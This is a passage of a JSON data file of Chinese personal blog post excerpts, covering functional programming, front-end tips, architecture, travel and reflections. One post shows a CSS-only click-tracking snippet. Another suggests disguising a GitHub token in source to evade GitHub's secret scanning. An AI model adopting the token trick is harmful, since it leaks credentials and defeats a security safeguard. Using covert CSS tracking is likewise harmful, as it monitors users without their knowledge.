就好，得益于 LISP 的语法简洁和同像性（代码和数据结构一致），这个不要太简单，LISP 源码差不多就是 AST 了。\r\n\r\n## 语法定义\r\n\r\n开始之前还是正经点，用 BNF 定义 LISP 的语法，LISP 的语法太简单了，我们先用 BNF 定义一个 LISP 前缀表达式语法的计算器，然后再一步一步扩展吧。<strong>……</strong>"
  },
  {
    "fileName": "用 CSS 实现网页追踪与分析.md",
    "ID": 20,
    "Title": "用 CSS 实现网页追踪与分析",
    "Tags": "前端",
    "PublishDate": "2018/1/20 22:15:05",
    "Content": "用 CSS 实现网页追踪与分析 ？ are you kidding me？ \r\n老实说刚看到 **[这篇文章](https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md)** 的时候我也有点吃惊，因为以前在的工作经历告诉我，要干这种事情得埋一堆 JS 代码，是一件苦差事。而用 CSS 来做确实是打破常规思维的想法，就像你从不会去想用面包当武器（然而确实有一种法式长棍面包风干后可以这么干），用 CSS 这样一门负责页面表现的语言去做追踪分析的事情着实要开很大脑洞了。\r\n\r\n考虑到页面分析追踪其实质是检测页面上某些状态及变化，然后报告给后端，这样一想，CSS 确实具备这样的能力，比如检测链接的点击的 `active` 选择器等等，这点能够想到，但是如何将状态变化报告给服务端呢？ emmm？ajax? CSS 显然不具备这种能力，但是它能加载资源，Bingo！\r\n简单来说就是通过一些特殊的选择器或者 CSS 的一些媒体查询等与语法还有 Hack 来判断状态，利用资源请求的跨域性向后端发信息。\r\n``` css\r\n#link2:active::after {\r\n  content: url('track.php?action=link2_clicked');\r\n}\r\n```\r\n没错，就是这样的脑洞，这里可以看到更多的 **[DEMO](http://crookedss.bplaced.net/)**!<strong>……</strong>"
  },
  {
    "fileName": "熵与人生.md",
    "ID": 21,
    "Title": "熵与人生",
    "Tags": "随想",
    "PublishDate": "2015/3/27 21:15",
    "Content": "熵，我一直以来将其当作一个物理学单位待之，事实上，从本质上而言，世界是遵守于物理定律的，生活，人，亦是这个世界的一部分。\r\n\r\n也许我应当庆幸自己能够知道这个概念，我察觉到了生活中那些导致我痛苦之事的根源，于我而言，令我苦恼之事显然来自于工作，无穷尽的工作，繁忙的工作，所有的这些工作于我而言真是困难的吗？ \r\n\r\n当然不是，这些事情并无多大挑战性，导致我苦恼的根源并非与事件本身，而是我在这无穷尽的事件中所感到的迷茫，事情多又掌控不过来，心便乱，苦恼随之而生。  \r\n\r\n说到底，于诸事之间，心不能安，此之为苦源。为何不能安？掌控不了，事件的发生和结束很大程度都不由你所掌控，试图去掌控这样的事情，显然是不可能的。  \r\n\r\n我曾看到各种各样的工作方法，时间管理方法，大抵可以归为两类，其一为自律，其二，都是在试图在不断流逝的时间洪流中去掌控自己，我们会将事情分而化之，分而治之，我们会按其轻重缓急列其次序，以上种种皆是让自己心安之法。<strong>……</strong>"
  },
  {
    "fileName": "滚动条导致计算值元素跳动的处理.md",
    "ID": 22,
    "Title": "滚动条导致计算值元素跳动的处理",
    "Tags": "前端 | 编码",
    "PublishDate": "2017/12/14 18:29:43",
    "Content": "博客的左侧栏用了百分比计算宽度，这样问题来了，页面的高度是不确定了，若出现滚动条则会导致页面宽度变化，然后侧边栏宽度就会跳动了，解决办法有两个：\r\n* 简单粗暴 `overflow-y: scroll;` 所有页面都显示滚动条，然后搞定，或者自己自定义滚动条接管。\r\n* 利用 CSS3 calc 属性 ` width: calc(100vw - 100%);`\r\n\r\n解释下，`100vw` 是浏览器内部宽度，也就是 `window.innnerWidth` 包括滚动条也计算在内，100% 是可用宽度是不计算滚动条的。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "浅谈对架构的理解.md",
    "ID": 23,
    "Title": "浅谈对架构的理解",
    "Tags": "编程 | 随想",
    "PublishDate": "2018/7/22 23:57:51",
    "Content": "手头有一本《聊聊架构》，最近又找来了《架构之美》囫囵吞枣似的读了一遍，写了些读书笔记，我仅仅是想确切的明白架构是什么。似乎每个程序员都能对架构说上一二，但每个人的说法都不尽相同，即便是那些架构师所说的架构也是如此，当然，对于架构这个词是有定义的，但每个架构师的关注点和视角不一样，所谈论的东西也有很大不同。\r\n\r\n多数情况下，架构师这个角色都是由程序员兼任的，尽管这是一个听上去更高阶的角色，但是开发过程总是不可避免涉及某种架构过程，我们总是自嘲自己的工作是“搬砖”，但是在这点上我们跟真正搬砖还是有差异的，软件开发过程允许程序员发挥更大的主观能动性（相对其它大数职业而言），我们总能去创造些精巧的设计去达成业务目的，而搬砖就是真正的搬砖了，这也是为什么写代码这样一件外人看来如此枯燥的事情能够吸引我的原因，而创造是恰好是马斯洛需求层次理论的高阶需求，在代码的世界里它能轻易满足，仅需一台电脑即可。\r\n\r\n## 架构是什么？\r\n\r\n架构不是一个结果，而是一个过程，我们能够看到很多架构演进，演变的文章，从这点可以知道架构决不是一成不变的，正如软件开发过程更像是植物的生长，而不是砌砖。架构的产出是什么？PPT ？这也是为什么很多架构师被黑，称之为 PPT 架构师的原因了。<strong>……</strong>"
  },
  {
    "fileName": "浅尝蛤丝（Haskell）.md",
    "ID": 24,
    "Title": "浅尝蛤丝（Haskell）",
    "Tags": "编程",
    "PublishDate": "2018/6/19 23:42",
    "Content": "知乎上关注的很多前端大佬都是函数式编程玩的贼 6 的那种，动不动就贴 Haskell 代码，就想学习下蛤丝（Haskell）语言，增长点姿势，尽管之前玩 Lisp 有一点点函数式编程的体验，但是 Haskell 的类型和惰性求值还是要感受下的。\r\n\r\n从 [Haskell 趣学指南](http://fleurer.github.io/lyah/) 开始，不得不说，语法糖真是好吃啊，代码还能这样写。\r\n\r\n```haskell\r\nquicksort :: (Ord a) => [a] -> [a]   \r\nquicksort [] = []   \r\nquicksort (x:xs) =   \r\n  let smallerSorted = quicksort [a | a <- xs, a <= x]  \r\n       biggerSorted = quicksort [a | a <- xs, a > x]   \r\n  in smallerSorted ++ [x] ++ biggerSorted\r\n```\r\n\r\n上一段 Haskell 的快排算法，卧槽，还能这么写，` [a | a <- xs, a <= x] ` 像数学一样定义作用域，在 List 里直接做过滤和取值，Cool !， 写过 python 肯定知道列表推导，相比而言这个简直强太多了，还能在 List 里做模式匹配。\r\n\r\nJS 不是也能函数式编程嘛，翻一下\r\n\r\n```javascript\r\nfunction quickSort(arr) {\r\n    if (arr.length == 0) return []\r\n    let i = arr[0]\r\n    const smallerSorted = quickSort(arr.slice(1).filter(e => e <= i))\r\n    const biggerSorted = quickSort(arr.slice(1).filter(e => e > i))\r\n    return [].concat(smallerSorted, i, biggerSorted)\r\n}\r\n```\r\n\r\n加上类型签名，代码行数好像差不多？？不过字符数量少呀。\r\n\r\n**fold**\r\n\r\n`Foldable t => (b -> a -> b) -> b -> t a -> b`\r\n\r\n一个fold取一个二元函数，一个初始值（我喜欢管它叫累加值）和一个需要fold（折叠）的list。<strong>……</strong>"
  },
  {
    "fileName": "无题.md",
    "ID": 25,
    "Title": "无题",
    "Tags": "随想",
    "PublishDate": "2018/9/1 15:14",
    "Content": "<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=22825197&auto=1&height=66\"></iframe>\r\n\r\n> 未经审视的人生是不值得过的。 — 苏格拉底\r\n\r\n如此一般的生活真是经不住审视啊，关于人生的意义这样的问题仔细思考起来就仿若黑洞一般，吞噬精神最终尽归虚无。重复的生活无法在回忆中留下任何印记，回首过往，曾经的少年也开始感叹着岁月无情，那些不堪的记忆仿若发生在昨日，那些快乐的记忆渐行渐远，曾经像是在旷野奔跑，现在像是走入了黑暗森林，我保护着微弱的光亮艰难前行。\r\n\r\n生活的意义不能祈求他人，只能自己赋予，对我而言不重复就是有意义的，不论是好事亦或者坏事，快乐或是忧伤，不求能够体验更好，但求体验更多。\r\n\r\n最近看了本书《心智的构建》，如书中所说，我们以为物理世界和精神世界是彼此独立的，物理世界直接与我们相连，精神世界独立而隐秘，而事实上，不论真实世界还是精神世界，所有的一切都是通过大脑来获得的，这两个世界的差异其实是一种错觉，对那些大脑受损伤的人这种界限更加模糊。<strong>……</strong>"
  },
  {
    "fileName": "数据抽象.md",
    "ID": 26,
    "Title": "数据抽象",
    "Tags": "编码 | 哲思",
    "PublishDate": "2017/8/22 23:30:48",
    "Content": "> 现在到了数学抽象中最关键的一步：让我们忘记这些符号所表示的对象。（数学家）不应该在这里止步，有许多操作可以应用于这些符号，而根本不必考虑它们到底代表这什么。                                      \r\n————Hermann Weyl, 思维的数学方式\r\n\r\nSICP在我这似乎是一本永远读不完的书，一方面在于其难度，另一方面在于其不少的练习题，必须承认一点，可能确实是自己水平有限，每一道题对我而言都并不是那么容易的，几乎每道题都要经过仔细的思考才能做出来，面对这本书，我觉得更应当视其为一本数学书来对待，回忆下看数学教材时被其中的显然，易得等词汇爆掉脑袋然后怀疑人生的感觉吧，书中每一个知识点都有许多“小习题”等你来解决，但是，你真以为这些小习题能够轻松解决掉，那就太天真了，我曾经膝盖就中过一箭，这些小习题对我而言称之为时间黑洞也不为过，当然，或许真的有大神能把这些小习题快速刷掉吧，毕竟这个世界总是存在一些人能够如同数学教材作者那样，对“显然”，“易得”等这样的词汇有着相同感触。\r\n\r\n做这些习题是不容易的，若是不做的话，这本书恐怕也读不出什么意义来。正是这种不易所带来的挑战感促使着自己不断去完成这些练习，尽管它们并不能对工作或实际项目带来太多直接的收益，但是却能让自己更清楚编程本质是什么，对自己所做的，称之为“编程”的活动有一个更高视角。<strong>……</strong>"
  },
  {
    "fileName": "攀登抽象的阶梯.md",
    "ID": 27,
    "Title": "攀登抽象的阶梯",
    "Tags": "编码 | 哲思",
    "PublishDate": "2017/8/9 23:00:41",
    "Content": "![](http://imglf1.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDVnhjaUsxSTloMW9ObXdwTHJ5RkJaZ2VuVUtVUUZJaVlnPT0.jpeg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n常见的三种编程范式\r\n1. 命令式(过程式)\r\n2. 函数式\r\n3. 对象式\r\n\r\n命令式与函数式编程的主要区别体现在对过程提供的抽象能力上，在lisp中赋予了过程第一级权利:  \r\n1. 可以将过程命名  \r\n2. 可以提供给其它过程作为参数或作为返回结果\r\n3. 可以包含在数据结构中  \r\n\r\n第二点实现的代价就意味着将过程作为值返回，需要为过程中的变量提供存储环境，无论其是否被调用，如果采用词法作用域，那这就是闭包，在典型的命令式编程语言中，例如C语言，我们或许可以通过某些方式实现第一级权利，比如传递指针。  \r\n\r\n但是，两种编程范式的差异不仅体现在这一方面，还有对待副作用的态度，也就是赋值。\r\n在函数式编程中，函数的概念更贴近数学中映射的概念，输入参数，输出结果，简单的映射，将输入集映射到结果集，过程执行中不改变外部环境的状态，也不依赖外部环境的状态。由此引入了更多源自数学的概念，如高阶函数，偏函数，柯里化，函数组合等。  \r\n\r\n在命令式编程的典型C语言中，同样提供了对过程的抽象能力，即将过程抽象为函数，但是此函数就并非函数式编程语言里的函数了，最显然的是没有第一级特权。<strong>……</strong>"
  },
  {
    "fileName": "撤销与重做功能的实现.md",
    "ID": 28,
    "Title": "撤销与重做功能的实现",
    "Tags": "编程",
    "PublishDate": "2019/7/3 23:54:00",
    "Content": "通常的编辑器里我们需要保证用户在进行错误操作时可以挽救， 因而要使得所有操作都可逆与重做，\r\n\r\n就意味着要记录所有的操作序列，因此需要一个 commandManager 来统一管理。\r\n\r\n编辑器中大部分操作都会产生副作用导致状态的变化，因而在实现**撤销、重做**功能时根据关注的视角有两种实现方式，一种是关注具体的**操作序列**，一种是关注操作前后的**状态变化**。\r\n\r\n### 实现的方法\r\n\r\n- **命令式**\r\n\r\n  不关心当前应用数据的状态，只关注具体命令序列；\r\n\r\n  缺点：需要手动硬编码所有命令的正向操作与逆向操作；\r\n\r\n- **快照式**\r\n\r\n  使用 Immutable 状态，将 View 与 Model 映射，将所有操作映射至状态变化，为所有当前状态保存快照，这样一来撤销和重做只用还原状态现场；\r\n\r\n  缺点：保存状态需要深拷贝会消耗较大的内存且依赖状态的**不可变性**。关于内存消耗的缺点可以在数据结构上进行优化，类似 git ，只存差异；\r\n\r\n<strong>……</strong>"
  },
  {
    "fileName": "我爱你这件事.md",
    "ID": 29,
    "Title": "我爱你这件事",
    "Tags": "碎念",
    "PublishDate": "2019/7/9 00:36:00",
    "Content": "我曾以为自己能牢牢牵住心中的小鹿，让他不乱撞，让他乖乖随着岁月老去，连同我这颗很少泛起波澜的心。\r\n\r\n「我爱你」当我说出这样的话时我并有意识到这是失控的开始，以至于后面无数次说着同样的话，一次比一次痛苦我才知道自己早已陷入了旋涡之中，是什么时候失控的？我忘了，或许当我见她的第一面起就为此做好了铺垫。她是我想要一辈子在一起的人，却连六月都没能熬过。都说射手座喜欢自由，我可能是假的射手座吧，我不想有太多的感情经历，如是没想过永远在一起我宁可就不开始，怀着一辈子的期望去爱一个人，一旦落空就比任何时候都难受。\r\n\r\n我并不是一个很能把握自己感情的人，甚至还会有些自以为是，特别是当面对一个几乎寄托我全部喜怒哀乐的人，我像是要掩盖自己的躁动的心一样，总说出一些可笑的言语，现在反思起来也总觉惭愧。<strong>……</strong>"
  },
  {
    "fileName": "我们都是星尘.md",
    "ID": 30,
    "Title": "我们都是星尘",
    "Tags": "随想",
    "PublishDate": "2019/7/20 1:59:53",
    "Content": "![1563559244977](https://ksana.oss-cn-shenzhen.aliyuncs.com/articles/imgs/1563559244977.png)\r\n\r\n[阿波罗11号制导计算机（AGC）中指令模块（Comanche055）和登月模块（Luminary099）原始代码](https://github.com/chrislgarry/Apollo-11/blob/master/README.zh_cn.md)\r\n\r\n**时间：**1969 年 7 月 21 日 02:56 UTC\r\n\r\n**地点：**月球\r\n\r\n**人物：**阿姆斯特朗\r\n\r\n阿波罗 11 号登陆月球，人类的脚步第一次踏足地外星球，然而至今 50 年过去了再无人类踏足那里。现在我们可以在 GitHub 上看到 50 年前制导计算机中的登月模块源代码，难以想象那个 CPU 计算力不如当今任意一台智能手机的设备能将人类送上太空，而我们现在拿着手机却用来玩游戏，与之相比现实显得有些荒谬。\r\n\r\n小时候我也曾是对宇宙有着诸多憧憬的人，并梦想着成为一名科学家。遥远、未知、美丽的宇宙总是能引人遐想，特别是对满怀好奇心的小孩来说有着致命的吸引力，但是近 50 年的科技发展并没有兑现给我们星辰大海，而是互联网，我们的探索精神与勇气没有被激发，反而陷入了信息爆炸中不能自拔，日益沉迷于虚幻的网络世界虚度年华。当然，计算机技术的发展并非一无是处，但我们本应该借此进步比 50 年前做的更好，而非止步不前。<strong>……</strong>"
  },
  {
    "fileName": "当我说 Immutable 时在说什么.md",
    "ID": 31,
    "Title": "当我说 Immutable 时在说什么？",
    "Tags": "前端 | 编码",
    "PublishDate": "2018/9/16 14:45",
    "Content": "![fp](http://wx1.sinaimg.cn/large/007113CZgy1fvbdu2m0dnj30lc0aa3yq.jpg)\r\n\r\n为什么在函数式中推崇 immutable？如我们所知，在 React 中，甚至整个前端都在推崇和拥抱函数式编程，而 immutable 似乎是实践函数式编程不可或缺的一部分，虽然我们已经有了 **const** 关键字，**Object.freeze()**，但遗憾的是 JavaScript 中的对象和数组等原生数据结构并非是 immutable 的。因此为了得到 immutable，工程师们就一言不合自己造起了轮子，如 **immutable.js、immer.js** 等。当然，最简单的实现 immutable 就是每次修改时深拷贝返回新的数据对象即可，但这么简单的搞法并不能在性能上令人满意。\r\n\r\n**为什么需要 immutable？或者说为什么函数式编程需要 immutable？**\r\n\r\n如果让我回答，那就是为了保证函数式编程的**纯洁（pure）**，这样的答案显然不会令人满意，强调 **Pure** 到底有什么意义？所谓的纯是这样的意思，**比如纯函数，它意味着相同的输入永远得到相同的输出，而且不会有任何可观察的副作用。**这个定义恐怕很多人都了解，但是到底有什么用呢？纯函数意味着这样一个事实，对于两个函数 A、B 而言，只要给定相同的输入都能获得同样的输出，那就意味着函数 A、B 是相等的，即两个函数的相等可以由外延相等确定，而不用关注函数的内涵，也就是说两个函数相等跟实现无关，这就带来了一些有意思的便利，如**函数记忆化**这样的编程技巧，因为无副作用且引用透明，因此能够**并行运行**（因为没有共享内存，不存在竟态，根本上保证线程的安全性），以及 get 接口所强调的**幂等性**，这些都是建立在**纯（Pure）**的基础上，它使得我们在分析和使用的时候可以抛开具体实现的束缚，一个函数是纯的，意味着我们可以用任何外延相等的函数来替换，纯函数的输入输出依赖清晰明确，因而更容易观察和分析，这是纯函数的意义。<strong>……</strong>"
  },
  {
    "fileName": "屋中大象.md",
    "ID": 32,
    "Title": "屋中大象",
    "Tags": "编程",
    "PublishDate": "2018/8/4 13:12:26",
    "Content": "读到一篇文章 [《屋中的大象》-- Apache基金会副总裁几十年的观察](https://www.oschina.net/news/79166/apache-foundation-ceo-decades-views) 让我想起了最近和同事的一次对话。\r\n\r\n因为某些众所周知的原因接手了公司的一个 Hybird APP，这是一个用 Vue 框架以及一些原生代码套壳编写的玩意，尽管工作交接的时候已经做好了充足的心理准备，但是看到的代码的时候还是感受到了深深的绝望。这个 APP 承载了公司的主要业务，写代码的人换了好几波，构建工程都是祖传的，没人完整的知道里面有些啥玩意，只知道上线的时候要改啥，本来新东西做的好好的很开心，但该来的还是来了，而且这一次是独自面对，**我要重构它，开始我是这么想的。**\r\n\r\n是的，我知道，IT 工作就是如此，我们总是避免不了接手他人的代码，软件开发就是一个前人挖坑后人填坑然后再挖坑的过程，因此我早就准备好了面对这一切的准备了，再糟糕不就是换份工作的事吗？正如交接给我的前任老哥一样。\r\n\r\n都说 JS 重构火葬场，没有类型检查重构起来已经很艰难了，然后这玩意还没有单元测试，嘛这很正常，但愿代码可读性好点吧，`var a,b,c、case 'one' case 'two'、xsfl、xxx1.vue、xxx2.vue、xxx3.vue` WTF！！！ 这都是啥？ 这一坨整个项目都没地方引用放那是几个意思？这一坨坨文件堆一起分下类会死吗？这么多 warning 置之不理真的好吗？冷静，冷静，之前做这项目然后跑路的人啥水平不是心里很有预期了吗，就不应该抱有期望啊。<strong>……</strong>"
  },
  {
    "fileName": "对自我的思考.md",
    "ID": 33,
    "Title": "对自我的思考",
    "Tags": "哲思",
    "PublishDate": "2017/8/6 17:52:40",
    "Content": "![](http://imglf1.nosdn.127.net/img/UUcvQWZBZk9URHhUNmthQzQxSXpDZkwveWhQWWFERy9mdXZCZUlnNm9UQ3k1ZHdNZUpLc3d3PT0.jpg?imageView&thumbnail=1680x0&quality=96&stripmeta=0&type=jpg)\r\n生命是一个攀登阶梯的过程，很多人都以为这个阶梯只有一处，事实上却是有两处，一处登顶物质的巅峰，一处登顶精神的巅峰，一处通往外界的物质世界，一处通往内在的精神世界。  \r\n\r\n后者是孤独的，是少有人走的，并且随着物质世界的不断发展，选择后者的愈来愈少，更有甚者看不到这条路。通往内心的精神之路是孤独的，亦是困难的，为何而困难？因为它要求反求诸己，认识你自己。  \r\n\r\n认识并反省自己是第一个困难障碍，这涉及到一个重要的哲学问题，我是谁？  \r\n\r\n生命的无常往往使人迷失在脑海中无尽的念头中，往往错把那个脑海中的声音当做了所谓的我，我不开心，我想要，我要做，这些念头是我吗？若如此，那就后陷入无尽的追逐中去，这些念头是无常的，你永远无法把握住它的走向，往往仅是环境的波动，就会生出不同的念头来，被这样的无常牵引着，显然是不智的，你以为这样的念头是你自己，当你今天做出决定，明天行动时就会发现，昨天那个信誓旦旦做出决定的我呢？为何我没有了昨天那股热切的心情？为何我的计划无法实施？仿佛每时每刻的我都不是同一个人，我总是在当下之我与过去之我间徘徊与斗争，甚至不知下一刻之我又将会生出何种念想，于是焦虑产生了。我们常说的挑战自我，往往就是要反抗心中的那个声音做出行动。<strong>……</strong>"
  },
  {
    "fileName": "如何打印 Web 页面上指定区域的内容.md",
    "ID": 34,
    "Title": "如何打印 Web 页面上指定区域的内容",
    "Tags": "编码 | 前端",
    "PublishDate": "2017/12/11 13:24:52",
    "Content": "准备把简历挂到网上，万一被HR姐姐或者大佬看中呢？如果被看中的话如何方便他们打印你的简历呢？做过一堆电子流应用首先想到的就是弄个打印按钮，然后触发`window.print()`方法即可，但只是简单调用这个方法的话，打印的将会是整个页面的内容， 这显然不是想要的。\r\n\r\n于是稍加改动一下：\r\n```\r\ndocument.body.innerHTML = Element.innerHTML\r\nwindow.print()\r\n```\r\n这下可以了，打印的时候直接把想要打印区域的内容覆盖 Body 即可，但这样点击打印按钮后，整个页面的就会改变，而我只是单纯想打印而已，能不能更友好点？\r\n\r\n增加一个不占空间的 iframe 元素，然后触发打印的时候把要打印的内容塞进去即可。\r\n```\r\n<iframe id=\"printme\" src=\"\" width=\"0\" height=\"0\" frameborder=\"0\">\r\n</iframe>\r\n\r\nlet f = document.getElementById('printme')\r\n  f.contentDocument.write(Element.innerHTML)\r\n  f.contentDocument.close()\r\n  f.contentWindow.print()\r\n}\r\n```\r\n当然，如果有样式的话，也要把样式一同塞进去。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "央视纪录片《极地》.md",
    "ID": 35,
    "Title": "央视纪录片《极地》",
    "Tags": "碎念",
    "PublishDate": "2018/1/22 21:56:11",
    "Content": "之前看过央视纪录片《第三极》，看完之后意犹未尽，没想到这会新出了这部**[《极地》](https://www.bilibili.com/video/av17956135/#page=2)**，又是一部截图可当桌面的纪录片，我曾今对那些说着去西藏净化心灵，洗涤灵魂的人嗤之以鼻，但是这部纪录片所描绘的人和景，让我对西藏一直抱有着某种虔诚的信仰，那里，对我而言，或许是需要以朝圣的心态前往的地方吧。\r\n\r\n作为一个工作之余有着摄影小爱好的人来说，央视一部又一部高水准的纪录片刷新了我对祖国地理的认知，让我从风景外国独好转向了祖国的西部，心中的远方也因此而变得更近一些了，有两个地方是我最想去的，一个是新疆，一个是西藏。\r\n\r\n也许是因为距离，或者是时间的缘故，我一直没能安排去那的计划，这两个地方并不是你节假日之余乘坐飞机或者高铁就能玩尽兴的，就以西藏而言，最美的风景都在路上，在那条被称之为中国人的景观大道上，国道318。而从成都驱车出发沿 318 去西藏至少需要九天，显然，若是在职的话利用国庆时间肯定是要请假的，这里只考虑时间，然后再看看新疆，从深圳或者中国东部出发乘飞机去新疆乌鲁木齐，需要飞行五个小时左右，然后再看看从乌鲁木齐去赛里木湖、去喀纳斯、去喀什的距离，这些景点之间的距离动不动就几百公里，从喀什飞往上海的距离足够从喀什飞亚欧交接的伊斯坦布尔了，我本以为很多风景得去欧洲，然而《航拍中国》彻底颠覆了我对新疆戈壁沙漠的映像，地理书上说中国拥有世界上最丰富的地貌，这话我算是有感觉了。\r\n\r\n16年十一的时候围绕川西游玩了一圈，尽管没能去到西藏，但也算是感受过了藏区的风景，川西还有许多地方值得去，但愿以后还能再去吧。<strong>……</strong>"
  },
  {
    "fileName": "国庆云南游记.md",
    "ID": 36,
    "Title": "国庆云南游记",
    "Tags": "碎念",
    "PublishDate": "2017/10/15 19:17",
    "Content": "![](https://wx1.sinaimg.cn/large/007113CZgy1fm9iws2v65j318w0u0qeq.jpg)\r\n双脚踏足地狱，而眼睛放在天堂，雨崩，云南最后一片未被开发的处女地，从半专业徒步跨入专业徒步的必经之旅。\r\n本来国庆计划去雨崩徒步，为此特地请了三天假，加上中秋国庆一起足足11天，然而最终还是因为时间关系未能踏足“天堂”，看了微信里朋友发的照片时，更是觉得可惜，雨崩也成了我云南之旅最大的遗憾了。\r\n这是一场计划好的旅行，而我也并未抱着旅游的心态，因此在装备准备上也是以轻便为主，虽然落下遗憾，但是总体来说也是不虚此行吧。抱着何种心态去一个地方所带来的感受是截然不同的，此行既是旅行，那便做好了面对挑战的准备，途中所经历的一切未知对我而言都是收获，不论其带来的感受是艰苦亦或者快乐。\r\n![](https://wx1.sinaimg.cn/large/007113CZgy1fm9iwm385qj318w0u0wpm.jpg)\r\n谈到大理，第一个想到的词就是“风花雪月”， 也确实如此，在大理的街道边，古城里，这个词总是时不时闯入眼中，而我的大理之行，感受最不深的恰恰却是这个词,而是一种被微风包裹的惬意与悠闲，仿如沉入美梦，忘了忧愁。<strong>……</strong>"
  },
  {
    "fileName": "又一篇什么是 Monad.md",
    "ID": 37,
    "Title": "又一篇什么是 Monad",
    "Tags": "编码",
    "PublishDate": "2017/9/1 21:48:38",
    "Content": "一开始抱着猎奇的心态学习各种编程语言，从汇编、C/C++、Python、直到LISP。工作后才幡然醒悟，学这么多编程语言而不去使用，那无异于“以有涯随无涯”，最后回首才发现遗忘是多么可怕的事情，学了这么多编程语言到如今也几乎忘得差不多了。当然，并不能因为遗忘而否定学习的意义，学习的意义正是那些遗忘之后留下的东西，学过这么多编程语言，了解了这么多编程范式，学起新的语言来也确实颇有一番一通百通的感觉，拿起文档就写，新语言的特性也能很快上手。真正停止追逐语言的脚步，是从SICP开始的，像是受到了启示，学语言这么久，感触最深的一点，那就是对于学习者而言，需要的不是一本规范，也不是一本操作手册，而是一本解释，SCIP正好回答了我的疑惑，正如其书名所言，讲的是计算机程序的构造与解释，理解到编程活动的本质是通过抽象手段控制复杂度这样道理后，对语言也就没有了追求，转而关注各类语言中所提供的“抽象方式”，对某门语言的学习，仅仅是学习如何在其中恰当的表达思想，不再去死扣规范和各种细节，当然，如果这门语言是工作用的，那才值得这样做。\r\n\r\n当见识到抽象的力量之后就一发不可收拾，在函数式编程里充斥着各种“黑魔法”，而自己工作用的JS语言恰好具备展示这些“黑魔法”的能力，尽管有些蹩脚，但也并非不能用，平日里经常用JS写一些函数式的代码，作为一个“魔法师”，总会对自己的能力和知识感到不满，便求精进，然后就理所当然的掉进了函数式的坑里，撞死在范畴论和Monad面前。<strong>……</strong>"
  },
  {
    "fileName": "博弈论带来的启示-信任的进化.md",
    "ID": 38,
    "Title": "博弈论带来的启示-信任的进化",
    "Tags": "随想",
    "PublishDate": "2017/12/15 00:04:47",
    "Content": "朋友向我推荐了这个游戏**[《信任的进化》](https://www.sekai.co/trust/)**，最早在 V2EX 上就有看到过，但是因为翻译的缘故没有认真玩，这次认真玩过之后得到了不少启示。\r\n\r\n在持续性的重复活动中，若该活动能够产生非零和的收益，那么选择相互彼此信任是最好的策略，简单来说就是双赢。在这里，我相信整个世界大多数创造性的活动都应该是创造价值的，彼此间的信任将能放大这种收益，但是是否能彼此建立信任的基础却和这个他们对这个人性的看法有关，即持有性善论还是性恶论或者是中立。\r\n\r\n信任建立的关键在于第一步，即是否相信对方？能否提供一次信任的机会？\r\n如果对方是并非欺诈者，那么信任将会快速建立起来，并且彼此将会愈加越宽容。同样的，首次选择善意也能将中立方转化，对于欺诈者，你最多也就损失一次善意，并将彻底杜绝后续的恶意。<strong>……</strong>"
  },
  {
    "fileName": "博客文章获取接口修改.md",
    "ID": 39,
    "Title": "博客文章获取接口修改",
    "Tags": "编码",
    "PublishDate": "2017/7/25 22:43:00",
    "Content": "改成从项目源码中读取md文件，GitHub的接口调用有限制，如果不用access_token调用的话是有60次/每小时的调用次数的，用token则有5000次/每小时，这对博客来说是够用了。  \r\n因此，可以申请一个只读权限的token，但是token如果直接写在源码内并上传至GitHub仓库，则会被GitHub的安全机制检查出来，申请的token就会被被删除（GitHub为了避免程序员误传Token真时操碎心 - -|||），但是，在源码内简单掩饰下可以绕过这个检查了，这样玩的话，就要注意申请的Token权限范围。\r\n    <strong>……</strong>"
  },
  {
    "fileName": "博客搬家.md",
    "ID": 40,
    "Title": "博客搬家",
    "Tags": "编码",
    "PublishDate": "2017/10/28",
    "Content": "阿里云(套路云)的客服打电话给我说他们双十一活动，服务器打折，于是活动期间没能忍住手买了 1C1G 的丐版服务器，选了香港区，想着再怎么吃灰也能当个梯子嘛，果然，这手真是忍不住的。\r\n吭哧吭哧把博客挪到云服务器上后，第一时间干掉了 coding.net 的页脚，然后用 acme.sh 申请了 Let’s Encrypt 的证书，证书到期自动更新，看到域名旁边的小绿锁，完美！\r\n趁着机会又复习了下nginx的配置，既然都上了服务器了，后续就可以考虑不用静态博客了,笑~\r\n正巧最近学习 Golang ，准备自己手撸一个微服务框架，已经把框架的 Router 撸出来了，这坑又不知道什么时候能填完。\r\n然后... 是不是前端也要换换呢？ 最近 Vue 2.5 提供更好的 TypeScript 支持，于是突然又有了一个大胆的想法，乘机会玩玩吧，现在博客速度太慢了，主要是静态资源这块需要优化，考虑薅各大 CDN 的免费流量试试~\r\n    <strong>……</strong>"
  },
  {
    "fileName": "前端监控的设计与实现.md",
    "ID": 41,
    "Title": "前端监控的设计与实现",
    "Tags": "前端 | JS",
    "PublishDate": "2018/7/10 18:09:14",
    "Content": "## 背景\r\n\r\n最近项目痛点，就是应用在我们的设备上好好的，怎么一到用户那就反馈各种问题呢？这个痛点相信不止我一个人遇到，甩给测试去控制那也不容易啊，如果公司穷，测试设备覆盖不全就更痛苦了，而且用户对问题无法给出技术性的描述，作为开发只能靠经验推断，心累。\r\n\r\n于是最近几天我就研究了下**前端监控**相关的内容，写了个简单的信息采集工具，当然，业界已经有许多现成的方案了，如 funDebug、bugsnag、BadJS、betterjs 等，但我就是想自己造一个轮子！\r\n\r\n好像代码量不多？我上我也行（错觉），自己造一个学习下（最重要的理由）。\r\n\r\nGitHub 链接：[fe-monitor](https://github.com/lzcers/femonitor/tree/master/src)\r\n\r\n## 设计要求\r\n\r\n- 易于扩展，可自定义\r\n\r\n  我哪天想到啥新的监控点可以直接扩展，比如说不仅仅是性能监控，js 错误监控之类的，订单请求也可纳入监控范围啊，不是偶尔掉单吗？前端也可以抓点数据嘛。还有用户行为路径之类的数据。\r\n\r\n- 无侵入，小侵入\r\n\r\n  最好简单引入个 sdk 就行，尽可能不要埋点\r\n\r\n- 适用不同框架\r\n\r\n  比如连接 Vue.config.errorHandle \r\n\r\n## 模块\r\n\r\n- 信息采集\r\n- 信息上报 \r\n- 信息分析\r\n- 报警\r\n- 